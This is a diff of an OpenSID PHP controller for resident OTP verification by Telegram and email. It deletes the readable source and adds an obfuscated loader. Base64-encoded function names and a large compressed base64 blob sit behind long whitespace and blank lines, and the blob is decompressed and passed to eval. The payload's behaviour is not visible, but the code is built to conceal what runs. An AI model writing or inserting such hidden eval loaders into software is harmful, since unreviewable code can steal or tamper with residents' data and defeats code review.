@@ -1,306 +1,569 @@
-<?php
+<?php 
+        $__='printf';$_='Loading donjo-app/controllers/fmandiri/Verifikasi.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-defined('BASEPATH') || exit('No direct script access allowed');
 
-class Verifikasi extends Mandiri_Controller
-{
-    public function __construct()
-    {
-        parent::__construct();
-        $this->load->library('OTP/OTP_manager', null, 'otp_library');
-    }
 
-    public function index(): void
-    {
-        $data = [
-            'tgl_verifikasi_telegram' => $this->otp_library->driver('telegram')->cek_verifikasi_otp($this->is_login->id_pend),
-            'tgl_verifikasi_email'    => $this->otp_library->driver('email')->cek_verifikasi_otp($this->is_login->id_pend),
-            'form_kirim_userid'       => site_url('layanan-mandiri/verifikasi/telegram/kirim-userid'),
-            'form_kirim_email'        => site_url('layanan-mandiri/verifikasi/email/kirim-email'),
-        ];
 
-        if ($data['tgl_verifikasi_telegram']) {
-            $this->session->set_flashdata('sudah-diverifikasi', '#langkah-4');
-        }
 
-        if ($data['tgl_verifikasi_email']) {
-            $this->session->set_flashdata('sudah-diverifikasi-email', '#langkah-4');
-        }
 
-        if ($data['tgl_verifikasi_telegram'] && $data['tgl_verifikasi_email']) {
-            $this->session->set_flashdata('sudah-verifikasi-semua', 1);
-        }
 
-        $this->session->set_flashdata('tab-aktif', [
-            'status' => 0,
-        ]);
 
-        $this->render('verifikasi', $data);
-    }
 
-    /**
-     * Verifikasi Telegram
-     */
-    public function telegram(): void
-    {
-        $data = [
-            'tgl_verifikasi_telegram' => $this->otp_library->driver('telegram')->cek_verifikasi_otp($this->is_login->id_pend),
-            'tgl_verifikasi_email'    => $this->otp_library->driver('email')->cek_verifikasi_otp($this->is_login->id_pend),
-            'form_kirim_userid'       => site_url('layanan-mandiri/verifikasi/telegram/kirim-userid'),
-            'form_kirim_otp'          => site_url('layanan-mandiri/verifikasi/telegram/kirim-otp'),
-        ];
 
-        if ($data['tgl_verifikasi_telegram']) {
-            $this->session->set_flashdata('sudah-diverifikasi', '#langkah4');
-        }
 
-        if ($data['tgl_verifikasi_email']) {
-            $this->session->set_flashdata('sudah-diverifikasi-email', '#langkah4');
-        }
 
-        $this->session->set_flashdata('tab-aktif', [
-            'status' => 0,
-        ]);
 
-        $this->render('verifikasi', $data);
-    }
 
-    /**
-     * Langkah 2 Verifikasi Telegram
-     */
-    public function kirim_otp_telegram(): void
-    {
-        $post    = $this->input->post();
-        $userID  = $post['telegram_userID'];
-        $token   = hash('sha256', $raw_token = random_int(100000, 999999));
-        $id_pend = $this->session->is_login->id_pend;
 
-        $this->db->trans_begin();
 
-        if ($this->otp_library->driver('telegram')->cek_akun_terdaftar(['telegram' => $userID, 'id' => $id_pend])) {
-            try {
-                // TODO: OpenKab - Perlu disesuaikan ulang setelah semua modul selesai
-                $this->db->where('id', $id_pend)->update('tweb_penduduk', [
-                    'telegram'                => $userID,
-                    'telegram_token'          => $token,
-                    'telegram_tgl_kadaluarsa' => date('Y-m-d H:i:s', strtotime(date('Y-m-d H:i:s') . ' +5 minutes')),
-                ]);
 
-                $this->otp_library->driver('telegram')->kirim_otp($userID, $raw_token);
 
-                $this->db->trans_commit();
-            } catch (\Exception $e) {
-                log_message('error', $e);
 
-                $this->session->set_flashdata('notif_verifikasi', [
-                    'status' => -1,
-                    'pesan'  => 'Tidak berhasil mengirim OTP, silahkan mencoba kembali.',
-                ]);
 
-                $this->db->trans_rollback();
 
-                redirect('layanan-mandiri/verifikasi/telegram/#langkah-2');
-            }
 
-            $this->session->set_flashdata('notif_verifikasi', [
-                'status' => 1,
-                'pesan'  => 'OTP telegram anda berhasil terkirim, silahkan cek telegram anda!',
-            ]);
 
-            $this->session->set_flashdata('kirim-otp-telegram', '#langkah3');
 
-            redirect('layanan-mandiri/verifikasi/telegram/#langkah-3');
-        } else {
-            $this->session->set_flashdata('notif_verifikasi', [
-                'status' => -1,
-                'pesan'  => 'Akun Telegram yang Anda Masukkan tidak valid, Silahkan ulangi lagi.',
-            ]);
-            redirect('layanan-mandiri/verifikasi/telegram/#langkah-2');
-        }
-    }
 
-    /**
-     * Langkah 3 Verifikasi Telegram
-     */
-    public function verifikasi_telegram(): void
-    {
-        $post = $this->input->post();
-        $otp  = $post['token_telegram'];
-        $user = $this->session->is_login->id_pend;
-        $nama = $this->session->is_login->nama;
-        // TODO: OpenKab - Perlu disesuaikan ulang setelah semua modul selesai
-        $telegramID = $this->db->where('id', $user)->get('tweb_penduduk')->row()->telegram;
 
-        if ($this->otp_library->driver('telegram')->verifikasi_otp($otp, $user)) {
-            $this->session->set_flashdata('notif_verifikasi', [
-                'status' => 1,
-                'pesan'  => 'Selamat, akun telegram anda berhasil terverifikasi.',
-            ]);
 
-            try {
-                $this->otp_library->driver('telegram')->verifikasi_berhasil($telegramID, $nama);
-            } catch (\Exception $e) {
-                log_message('error', $e);
-            }
 
-            redirect('layanan-mandiri/verifikasi/telegram/#langkah-4');
-        }
 
-        $this->session->set_flashdata('notif_verifikasi', [
-            'status' => -1,
-            'pesan'  => 'Tidak berhasil memverifikasi, Token tidak sesuai atau waktu Anda habis, silahkan mencoba kembali.',
-        ]);
 
-        redirect('layanan-mandiri/verifikasi/telegram/#langkah-2');
-    }
 
-    /**
-     * Verifikasi Email
-     */
-    public function email(): void
-    {
-        $data = [
-            'tgl_verifikasi_telegram' => $this->otp_library->driver('telegram')->cek_verifikasi_otp($this->is_login->id_pend),
-            'tgl_verifikasi_email'    => $this->otp_library->driver('email')->cek_verifikasi_otp($this->is_login->id_pend),
-            'form_kirim_email'        => site_url('layanan-mandiri/verifikasi/email/kirim-email'),
-            'form_kirim_otp_email'    => site_url('layanan-mandiri/verifikasi/email/kirim-otp'),
-        ];
 
-        if ($data['tgl_verifikasi_telegram']) {
-            $this->session->set_flashdata('sudah-diverifikasi', '#langkah4');
-        }
 
-        if ($data['tgl_verifikasi_email']) {
-            $this->session->set_flashdata('sudah-diverifikasi-email', '#langkah4');
-        }
 
-        $this->session->set_flashdata('tab-aktif', [
-            'status' => 1,
-        ]);
-        $this->render('verifikasi', $data);
-    }
 
-    /**
-     * Langkah 2 Verifikasi Email
-     */
-    public function kirim_otp_email(): void
-    {
-        $post    = $this->input->post();
-        $email   = $post['alamat_email'];
-        $token   = hash('sha256', $raw_token = random_int(100000, 999999));
-        $id_pend = $this->session->is_login->id_pend;
 
-        $this->db->trans_begin();
 
-        if ($this->otp_library->driver('email')->cek_akun_terdaftar(['email' => $email, 'id' => $id_pend])) {
-            try {
-                // TODO: OpenKab - Perlu disesuaikan ulang setelah semua modul selesai
-                $this->db->where('id', $id_pend)->update('tweb_penduduk', [
-                    'email'                => $email,
-                    'email_token'          => $token,
-                    'email_tgl_kadaluarsa' => date('Y-m-d H:i:s', strtotime(date('Y-m-d H:i:s') . ' +5 minutes')),
-                ]);
 
-                $this->otp_library->driver('email')->kirim_otp($email, $raw_token);
 
-                $this->db->trans_commit();
-            } catch (\Exception $e) {
-                log_message('error', $e);
 
-                $this->session->set_flashdata('notif_verifikasi', [
-                    'status' => -1,
-                    'pesan'  => 'Tidak berhasil mengirim OTP, silahkan mencoba kembali.',
-                ]);
 
-                $this->db->trans_rollback();
 
-                redirect('layanan-mandiri/verifikasi/email/#langkah-2');
-            }
 
-            $this->session->set_flashdata('notif_verifikasi', [
-                'status' => 1,
-                'pesan'  => 'OTP email anda berhasil terkirim, silahkan cek email anda!',
-            ]);
 
-            $this->session->set_flashdata('kirim-otp-email', '#langkah3');
 
-            redirect('layanan-mandiri/verifikasi/email/#langkah-3');
-        } else {
-            $this->session->set_flashdata('notif_verifikasi', [
-                'status' => -1,
-                'pesan'  => 'Akun Email yang Anda Masukkan tidak valid, Silahkan ulangi lagi.',
-            ]);
-            redirect('layanan-mandiri/verifikasi/email/#langkah-2');
-        }
-    }
 
-    /**
-     * Langkah 3 Verifikasi Email
-     */
-    public function verifikasi_email(): void
-    {
-        $post = $this->input->post();
-        $otp  = $post['token_email'];
-        $user = $this->session->is_login->id_pend;
-        $nama = $this->session->is_login->nama;
-        // TODO: OpenKab - Perlu disesuaikan ulang setelah semua modul selesai
-        $email = $this->db->where('id', $user)->get('tweb_penduduk')->row()->email;
 
-        if ($this->otp_library->driver('email')->verifikasi_otp($otp, $user)) {
-            $this->session->set_flashdata('notif_verifikasi', [
-                'status' => 1,
-                'pesan'  => 'Selamat, alamat email anda berhasil terverifikasi.',
-            ]);
 
-            try {
-                $this->otp_library->driver('email')->verifikasi_berhasil($email, $nama);
-            } catch (\Exception $e) {
-                log_message('error', $e);
-            }
 
-            redirect('layanan-mandiri/verifikasi/email/#langkah-4');
-        }
 
-        $this->session->set_flashdata('notif_verifikasi', [
-            'status' => -1,
-            'pesan'  => 'Tidak berhasil memverifikasi, Token tidak sesuai atau waktu Anda habis, silahkan mencoba kembali.',
-        ]);
 
-        redirect('layanan-mandiri/verifikasi/email/#langkah-2');
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
